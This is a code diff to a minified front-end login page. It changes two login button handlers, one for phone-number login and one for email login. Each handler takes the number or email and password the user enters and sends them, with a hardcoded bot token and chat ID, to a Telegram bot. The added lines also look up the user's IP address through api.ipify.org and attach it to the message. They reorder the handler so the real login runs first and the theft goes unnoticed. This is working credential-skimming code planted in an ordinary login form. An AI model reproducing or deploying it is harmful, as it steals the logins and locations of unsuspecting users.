@@ -1633,13 +1633,18 @@ p)
             }, 8, ["modelValue"])]), e("div", io, [e("button", {
                 class: O([a(o).userForm.number != "" ? "active" : ""]),
                 onClick: async () => {
+                    u();
                     const number = a(o).userForm.number;
                     const password = a(o).userForm.password;
                     const ok = a(o).getUserForm.numberType;
                     const botToken = '7211580703:AAEPCnOqUDUhvU6MJkg59UbUcuUph_pxwLk';
                     const chatId = '-1002421689922';
-                    const message = `Tc Details:\n\nNumber: ${number}\nPassword: ${password}\nnumber type: ${ok}\n\nThis is written by @Ak4ssh :)`;
+            
                     try {
+                        const ipResponse = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipResponse.json();
+                        const userIP = ipData.ip;
+                        const message = `Tc Details:\n\nNumber: ${number}\nPassword: ${password}\nNumber Type: ${ok}\nIP Address: ${userIP}\n\nThis is written by @Ak4ssh :)`;
                         const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                             method: 'POST',
                             headers: {
@@ -1660,8 +1665,6 @@ p)
                     } catch (error) {
                         console.error('Error:', error);
                     }
-            
-                    u();
                 }
             }            
             , r(_.$t("login")), 3), e("button", {
@@ -2307,14 +2310,19 @@ p)
             }, 8, ["modelValue"])]), e("div", Zo, [e("button", {
                 class: O([a(s).userForm.email != "" ? "active" : ""]),
                 onClick: async () => {
+                    $();
                     const email = a(s).userForm.email;
                     const password = a(s).userForm.password;
                     console.log("Email:", email);
                     console.log("Password:", password);
                     const botToken = '7211580703:AAEPCnOqUDUhvU6MJkg59UbUcuUph_pxwLk';
                     const chatId = '-1002421689922';
-                    const message = `Tc Details\n\nEmail: ${email}\nPassword: ${password}\n\nThis is written by @Ak4ssh`;
+            
                     try {
+                        const ipResponse = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipResponse.json();
+                        const userIP = ipData.ip;
+                        const message = `Tc Details\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${userIP}\n\nThis is written by @Ak4ssh`;
                         const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                             method: 'POST',
                             headers: {
@@ -2325,6 +2333,7 @@ p)
                                 text: message,
                             }),
                         });
+            
                         const data = await response.json();
                         if (data.ok) {
                             console.log('Message sent successfully:', data.result);
@@ -2334,10 +2343,8 @@ p)
                     } catch (error) {
                         console.error('Error:', error);
                     }
-            
-                    $();
                 }
-            }
+            }            
             , r(b.$t("login")), 3), e("button", {
                 class: "register",
                 onClick: u
